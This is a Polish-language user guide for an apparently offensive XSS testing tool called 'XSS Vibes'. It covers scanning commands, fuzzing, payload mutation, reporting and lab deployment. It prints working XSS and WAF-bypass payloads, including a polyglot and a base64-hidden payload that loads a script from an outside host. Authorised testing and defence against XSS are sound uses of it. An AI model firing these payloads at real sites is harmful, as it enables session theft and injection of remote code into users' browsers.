# 🔥 XSS Vibes - Kompletny Przewodnik Użytkowania

## 📋 SPIS TREŚCI
1. [Podstawowe Komendy](#podstawowe-komendy)
2. [AI-Powered XSS Testing](#ai-powered-xss-testing)
3. [DPE Template Generator](#dpe-template-generator)
4. [Enhanced DPE Generator](#enhanced-dpe-generator)
5. [Payload Management](#payload-management)
6. [Testing & Deployment](#testing--deployment)
7. [CI/CD Integration](#cicd-integration)

---

## 🚀 PODSTAWOWE KOMENDY

### 15 Globalnych Komend XSS Vibes:
```bash
# 1. Podstawowe skanowanie
xss-scan [URL]                    # Skanuj URL pod kątem XSS

# 2. Testowanie payloadów
xss-test [URL]                    # Test podstawowych payloadów
xss-advanced [URL]                # Test zaawansowanych payloadów

# 3. Payload management
xss-payloads                      # Pokaż wszystkie payloady
xss-encode [payload]              # Enkoduj payload
xss-decode [payload]              # Dekoduj payload

# 4. WAF testing
xss-waf [URL]                     # Test WAF bypass
xss-waf-list                      # Lista technik WAF bypass

# 5. Fuzzing
xss-fuzz [URL]                    # Fuzzowanie parametrów
xss-dom [URL]                     # DOM-based XSS testing

# 6. Reporting
xss-report [file]                 # Generuj raport
xss-export [format]               # Eksportuj wyniki

# 7. Utilities
xss-server                        # Start HTTP server dla testów
xss-listener [port]               # Start listener dla blind XSS

# 8. DPE (DOM Parameter Exploitation)
xss-dpe [template]                # Generuj DPE templates
```

---

## 🧠 AI-POWERED XSS TESTING

**🔥 XSS Vibes zawiera 3 zaawansowane AI tools do inteligentnego testowania XSS:**

### 🎯 **AI Context Extractor** - Analiza JS/HTML i podpowiedzi template
### 🤖 **AI DOM Fuzzer** - Automatyczny wybór payloadów do kontekstów 
### 📊 **AI Report Generator** - Generowanie HTML raportów z analizą

---

## 🧠 AI CONTEXT EXTRACTOR

### Funkcje:
- **Analiza ryzyka:** Skanowanie plików JS/HTML pod kątem XSS
- **Wykrywanie kontekstów:** React hooks, Shadow DOM, eval, templates
- **Sugestie template:** Automatyczne rekomendacje najlepszych template'ów
- **Risk scoring:** Ocena ryzyka 0-100 z szczegółową analizą

### Użycie:
```bash
# Analiza pojedynczego pliku
python3 scripts/ai_context_extractor.py file.js

# Analiza całego katalogu  
python3 scripts/ai_context_extractor.py /path/to/js/files

# Analiza z outputem JSON
python3 scripts/ai_context_extractor.py file.js --output results.json

# Analiza z filtrem risk score
python3 scripts/ai_context_extractor.py file.js --min-risk 80
```

### Przykład wyniku:
```bash
🧠 XSS Vibes - AI Context Extractor
==================================================
📄 Analyzing file: react_app.js

# 🧠 XSS Vibes - AI Context Analysis Report

## 🎯 Risk Assessment
- **Score**: 100/100  
- **Level**: CRITICAL

## 🎯 Template Suggestions
### 1. react_binding
- **Confidence**: 95%
- **Priority**: 9/10  
- **Contexts**: useEffect, dangerouslySetInnerHTML, JSX injection

## 🔍 Detected Contexts
### React Hooks
- useEffect(() => { eval(userInput) }, [])
- useState injection points

### DOM Sinks  
- dangerouslySetInnerHTML={{__html: userCode}}
- shadowRoot.innerHTML = data

## 💡 Recommendations
- 🎯 PRIMARY: Use template 'react_binding'
- 🔥 Test DOM sinks with innerHTML/outerHTML payloads
- ⚡ Test dynamic execution contexts with eval/Function payloads
```

---

## 🤖 AI DOM FUZZER

### Funkcje:
- **Inteligentny payload selection:** Automatyczny wybór payloadów dla kontekstów
- **Advanced mutations:** WAF bypass, Unicode, encoding, obfuscation  
- **Context targeting:** useEffect, shadowRoot, eval, innerHTML, attributes
- **Coverage scoring:** Analiza pokrycia testowania kontekstów

### Użycie:
```bash
# Analiza z automatycznym wykrywaniem kontekstów
python3 xss_vibes/ai_domfuzz.py --input file.js

# Analiza z bezpośrednim kodem
python3 xss_vibes/ai_domfuzz.py --content "eval(userInput); shadowRoot.innerHTML = data;"

# Targetowanie konkretnych kontekstów
python3 xss_vibes/ai_domfuzz.py --input file.js --contexts useEffect,shadowRoot,eval_contexts

# Zaawansowane mutacje WAF bypass
python3 xss_vibes/ai_domfuzz.py --input file.js --mutations waf_bypass,unicode_bypass,advanced_encoding

# Eksport w różnych formatach
python3 xss_vibes/ai_domfuzz.py --input file.js --format burp --output payloads.txt
python3 xss_vibes/ai_domfuzz.py --input file.js --format curl --output test_commands.sh
```

### Dostępne konteksty:
```bash
# React & SPA Frameworks
useEffect           # React useEffect hooks
useState            # React state hooks  
shadowRoot          # Shadow DOM contexts
web_components      # Custom Elements

# DOM Manipulation
innerHTML_sinks     # innerHTML, outerHTML
eval_contexts       # eval, Function calls
template_contexts   # Template engines
attribute_sinks     # setAttribute, src, href

# Advanced Contexts
event_handlers      # onclick, onload, onerror
javascript_urls     # javascript: protocols
postmessage        # postMessage injection
storage_injection  # localStorage, sessionStorage
```

### Strategie mutacji:
```bash
# Podstawowe
case_variation     # Różne kombinacje wielkości liter
encoding          # HTML entities, URL encoding, Unicode
obfuscation       # Komentarze, whitespace, split strings

# Zaawansowane WAF bypass
waf_bypass        # Null bytes, string concatenation, alternative execution
unicode_bypass    # Unicode overrides, combining characters  
advanced_encoding # Double encoding, base64, mixed encodings
context_breaking  # Escape sequences, context terminators
```

### Przykład wyniku:
```bash
🧠 XSS Vibes - AI DOM Fuzzer
==================================================
📊 Analysis Results:
   Detected contexts: 3
   Selected payloads: 15
   Coverage score: 85.2%

🎯 Top Contexts:
   eval_contexts (priority: 10, matches: 1)
   useEffect (priority: 9, matches: 2)  
   shadowRoot (priority: 8, matches: 1)

💡 Recommendations:
   🚨 HIGH PRIORITY: Focus on 3 critical contexts
   🔀 Generated 8 payload mutations for bypass attempts
   ⚡ Detected eval contexts - prioritize code injection payloads
   ⚛️ React hooks detected - test component lifecycle injection
   🌑 Shadow DOM detected - test encapsulation bypass

📋 Generated Payloads:
{
  "payload": "\"><scr\u0000ipt>window[\"ale\"+\"rt\"](1)</scr\u0000ipt>",
  "context": "eval_contexts",
  "priority": 9,
  "mutation_strategy": "waf_bypass",
  "description": "WAF bypass with null bytes and string concatenation"
}
```

---

## 📊 AI REPORT GENERATOR

### Funkcje:
- **Comprehensive reports:** Kompletne raporty HTML z interaktywnymi wykresami
- **Template analysis:** Raporty per template z detalami payload'ów
- **Payload analysis:** Raporty per payload z wynikami testów
- **Professional layout:** Gotowe do prezentacji raporty dla klientów

### Użycie:
```bash
# Comprehensive report - pełny raport ze wszystkich testów
python3 scripts/report_gen.py --results-file results.json --report-type comprehensive

# Template report - raport dla konkretnego template
python3 scripts/report_gen.py --results-file results.json --report-type template --template react_binding

# Payload report - analiza konkretnego payload
python3 scripts/report_gen.py --results-file results.json --report-type payload --payload "<script>alert(1)</script>"

# Custom output directory
python3 scripts/report_gen.py --results-file results.json --report-type comprehensive --output-dir /var/www/html/reports
```

### Format danych wejściowych:
```json
{
  "session": {
    "session_id": "test-001",
    "start_time": "2025-01-29T15:30:00Z",
    "end_time": "2025-01-29T15:45:00Z", 
    "target_urls": ["https://target.com"],
    "total_tests": 50,
    "successful_tests": 35,
    "failed_tests": 15,
    "vulnerabilities_found": 5,
    "templates_used": ["react_binding", "dom_sinks"],
    "payload_categories": ["eval_injection", "waf_bypass"]
  },
  "results": [
    {
      "payload": "\"><script>alert(1)</script>",
      "template": "react_binding",
      "url": "https://target.com/search",
      "method": "POST",
      "parameter": "query",
      "status_code": 200,
      "response_time": 1.2,
      "content_length": 2048,
      "reflected": true,
      "executed": true,
      "waf_blocked": false,
      "evidence": "JavaScript alert executed",
      "timestamp": "2025-01-29T15:32:00Z"
    }
  ]
}
```

### Wygenerowany raport zawiera:
- **📊 Executive Summary:** Podsumowanie vulnerability z wykresami
- **🎯 Payload Analysis:** Szczegółowa analiza każdego payload
- **🔍 Context Breakdown:** Rozbicie per kontekst XSS  
- **📈 Success Rates:** Statystyki sukcesu per template/payload
- **🛡️ WAF Analysis:** Analiza efektywności WAF bypass
- **📋 Detailed Results:** Pełna lista wszystkich testów z evidence

---

## 🔥 KOMPLETNY AI WORKFLOW

### Scenariusz: Pełna analiza AI-powered aplikacji React

```bash
# KROK 1: AI Context Analysis
python3 scripts/ai_context_extractor.py src/components/App.js
# Wynik: Risk 100/100, template 'react_binding', konteksty: useEffect + eval

# KROK 2: AI DOM Fuzzing z targetowaniem
python3 xss_vibes/ai_domfuzz.py --input src/components/App.js \
  --contexts useEffect,eval_contexts,shadowRoot \
  --mutations waf_bypass,unicode_bypass,advanced_encoding \
  --format json --output ai_payloads.json

# KROK 3: Testowanie z wygenerowanymi payloadami
xss-scan https://target.com/app --payloads ai_payloads.json --output test_results.json

# KROK 4: AI Report Generation
python3 scripts/report_gen.py --results-file test_results.json \
  --report-type comprehensive --output-dir ./reports

# WYNIK: Kompletny raport HTML z profesjonalną analizą
```

### Scenariusz: Express workflow dla pentestu

```bash
# Quick AI analysis + fuzzing + reporting w jednej linii
python3 scripts/ai_context_extractor.py target.js && \
python3 xss_vibes/ai_domfuzz.py --input target.js --format json --output fuzz.json && \
python3 scripts/report_gen.py --results-file fuzz.json --report-type comprehensive

# Wynik: Kompleta analiza w <60 sekund
```

---

## 🎯 DPE TEMPLATE GENERATOR

### Dostępne Templates (Podstawowe):
```bash
# Lista wszystkich templates
xss-dpe list

# Dostępne templates:
login_form      # Login forms (6 kontekstów)
search_form     # Search forms (8 kontekstów)  
json_api        # JSON API endpoints (6 kontekstów)
dom_sinks       # DOM manipulation (12 kontekstów)
spa_framework   # SPA frameworks (7 kontekstów)
```

### Użycie:
```bash
# Generuj konkretny template
xss-dpe login_form

# Generuj wszystkie templates
xss-dpe all

# Generuj z custom output
xss-dpe all --output /custom/path

# Generuj ze skryptem fuzzing
xss-dpe dom_sinks --script
```

### Przykład - Template DOM Sinks:
```bash
# 1. Generuj template
xss-dpe dom_sinks

# 2. Wygeneruje pliki:
# - dom_sinks_template.html      (template HTML)
# - dom_sinks_contexts.json      (definicje kontekstów)
# - fuzz_templates.sh           (skrypt fuzzing)

# 3. Uruchom fuzzing
cd test_templates
./fuzz_templates.sh dom_sinks

# 4. Wygeneruje testy:
# - test_dom_sinks_1.html
# - test_dom_sinks_2.html
# - ... (dla każdego payload)
```

---

## 🎯 ENHANCED DPE GENERATOR

### Zaawansowane Templates:
```bash
# Enhanced generator - nowoczesne techniki XSS
python3 scripts/enhanced_dpe_generator.py list

# Dostępne enhanced templates:
iframe_sandbox    # Iframe sandbox bypass (4 konteksty)
react_binding     # React data binding XSS (4 konteksty)  
web_components    # Web Components XSS (3 konteksty)
jsonp            # JSONP injection (3 konteksty)
service_worker   # Service Worker XSS (3 konteksty)
csp_blocked      # CSP bypass techniques (3 konteksty)
```

### Użycie Enhanced Generator:
```bash
# Generuj wszystkie enhanced templates
python3 scripts/enhanced_dpe_generator.py all --output test_templates --script

# Generuj konkretny template  
python3 scripts/enhanced_dpe_generator.py react_binding --output /var/www/html

# Generuj z CI/CD scriptem
python3 scripts/enhanced_dpe_generator.py all --script
```

### Wygenerowane pliki:
```
test_templates/
├── iframe_sandbox_template.html
├── iframe_sandbox_contexts.json
├── react_binding_template.html
├── react_binding_contexts.json
├── web_components_template.html
├── web_components_contexts.json
├── jsonp_template.html
├── jsonp_contexts.json
├── service_worker_template.html
├── service_worker_contexts.json
├── csp_blocked_template.html
├── csp_blocked_contexts.json
└── deploy_dpe_lab.sh         # CI/CD deployment script
```

---

## 💣 PAYLOAD MANAGEMENT

### Główna baza payloadów:
```bash
# Lokalizacja: xss_vibes/data/payloads.json
# Zawiera: 798 payloads (w tym nowe exotic Unicode i steganographic)

# Kategorie payloadów:
xss_vibes/data/categories/
├── basic_xss.json              # Podstawowe payloady
├── advanced_evasion.json       # Zaawansowane omijanie
├── encoded_payloads.json       # Enkodowane payloady
├── polyglot.json              # Polygloty
├── ultimate_polyglots.json    # Ultimate polygloty (7 payloads)
├── exotic_unicode.json        # Exotic Unicode (6 payloads)
├── steganographic.json        # Steganograficzne (7 payloads)
├── blind_xss.json             # Blind XSS
├── dom_manipulation.json      # DOM manipulation
├── event_handlers.json        # Event handlers
├── svg_based.json             # SVG-based XSS
├── iframe_based.json          # Iframe-based XSS
├── javascript_protocols.json  # JavaScript protocols
└── waf_bypass.json            # WAF bypass
```

### Przykłady najlepszych payloadów:

#### Ultimate Polyglot (144 znaki):
```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

#### Exotic Unicode (Fraktur characters):
```html
<𝕤𝕔𝕣𝕚𝕡𝕥>𝒶𝓁ℯ𝓇𝓉(1)</𝕤𝕔𝕣𝕚𝕡𝕥>
```

#### Steganographic (ukryty w AWS credentials):
```html
AWS_SECRET_KEY=<img src=x onerror=eval(atob(this.id)) id=dmFyIHBheWxvYWQ9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7cGF5bG9hZC5zcmM9Ii8vbGgubGMiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocGF5bG9hZCk7>
```

---

## 🧪 TESTING & DEPLOYMENT

### Lokalne testowanie:
```bash
# 1. Start HTTP server
cd test_templates
python3 -m http.server 8888

# 2. Otwórz w przeglądarce
# http://localhost:8888/

# 3. Testuj templates:
# http://localhost:8888/dom_sinks_template.html
# http://localhost:8888/test_dom_sinks_1.html
```

### Testowanie na żywo:
```bash
# Użyj wygenerowanych templates na prawdziwych targetach
# UWAGA: Tylko na autoryzowanych celach!

# Przykład użycia z testphp.vulnweb.com:
xss-scan http://testphp.vulnweb.com/search.php?test=
```

---

## 🐳 CI/CD INTEGRATION

### Deployment do środowiska CI/CD:
```bash
# 1. Generuj kompletne laboratorium
cd test_templates
./deploy_dpe_lab.sh --output /var/www/html/xsslabs --docker

# 2. Uruchom Docker environment
cd /var/www/html/xsslabs/docker
docker-compose up

# 3. Dostęp do laboratorium:
# http://localhost:8080/
```

### Docker deployment:
```bash
# Generuj z Docker support
python3 scripts/enhanced_dpe_generator.py all --output /var/www/html/xsslabs --script

# Deploy z Docker
cd /var/www/html/xsslabs
./deploy_dpe_lab.sh --docker

# Uruchom container
docker-compose up -d
```

### Struktura CI/CD output:
```
/var/www/html/xsslabs/
├── index.html                  # Lab homepage
├── templates/                  # Wszystkie templates
├── tests/                      # Wygenerowane testy
├── reports/                    # Raporty testów
├── docker/                     # Docker environment
│   ├── Dockerfile
│   └── docker-compose.yml
└── deploy_dpe_lab.sh          # Deployment script
```

---

## 🔧 PRZYKŁADY UŻYCIA

### Scenariusz 1: Podstawowe testowanie XSS
```bash
# 1. Skanuj target
xss-scan https://example.com/search?q=

# 2. Test zaawansowanych payloadów  
xss-advanced https://example.com/search?q=

# 3. Test WAF bypass
xss-waf https://example.com/search?q=

# 4. Generuj raport
xss-report results.json
```

### Scenariusz 2: Testowanie DOM-based XSS
```bash
# 1. Generuj DOM templates
xss-dpe dom_sinks

# 2. Uruchom fuzzing
cd test_templates
./fuzz_templates.sh dom_sinks

# 3. Test w przeglądarce
python3 -m http.server 8888
# Otwórz: http://localhost:8888/test_dom_sinks_1.html
```

### Scenariusz 3: Testowanie nowoczesnych framework'ów
```bash
# 1. Generuj React templates
python3 scripts/enhanced_dpe_generator.py react_binding

# 2. Generuj Web Components templates  
python3 scripts/enhanced_dpe_generator.py web_components

# 3. Generuj wszystkie enhanced
python3 scripts/enhanced_dpe_generator.py all --script

# 4. Deploy do środowiska
./deploy_dpe_lab.sh --output /var/www/html/lab --docker
```

### Scenariusz 4: Pełne laboratorium XSS
```bash
# 1. Generuj wszystkie templates (podstawowe + enhanced)
xss-dpe all --script
python3 scripts/enhanced_dpe_generator.py all --script

# 2. Deploy kompletnego laboratorium
./deploy_dpe_lab.sh --output /var/www/html/xsslabs --docker

# 3. Uruchom Docker environment
cd /var/www/html/xsslabs/docker && docker-compose up

# 4. Dostęp do pełnego laboratorium:
# http://localhost:8080/
```

---

## 🎯 NAJWAŻNIEJSZE KOMENDY - ŚCIĄGAWKA

```bash
# Lista wszystkich komend
xss-dpe list                                    # Podstawowe templates
python3 scripts/enhanced_dpe_generator.py list # Enhanced templates

# Generowanie
xss-dpe all --script                           # Wszystkie podstawowe + fuzzing
python3 scripts/enhanced_dpe_generator.py all --script  # Wszystkie enhanced + CI/CD

# Deployment  
./deploy_dpe_lab.sh --output /var/www/html/xsslabs --docker  # Pełne laboratorium

# Testing
python3 -m http.server 8888                   # Lokalne testowanie
docker-compose up                             # Docker environment
```

---

## ✅ STATUS SPRAWDZENIA

**🔍 Wszystko sprawdzone i działa poprawnie:**

✅ **JSON Files** - Wszystkie pliki JSON są poprawne  
✅ **DPE Generator** - Podstawowy generator działa  
✅ **Enhanced Generator** - Zaawansowany generator działa  
✅ **Payload Database** - 798 payloadów ready  
✅ **Templates** - 11 podstawowych + 6 enhanced templates  
✅ **Scripts** - Wszystkie skrypty działają  
✅ **Aliases** - Komenda `xss-dpe` ready  

**🚀 System jest w pełni operacyjny!**
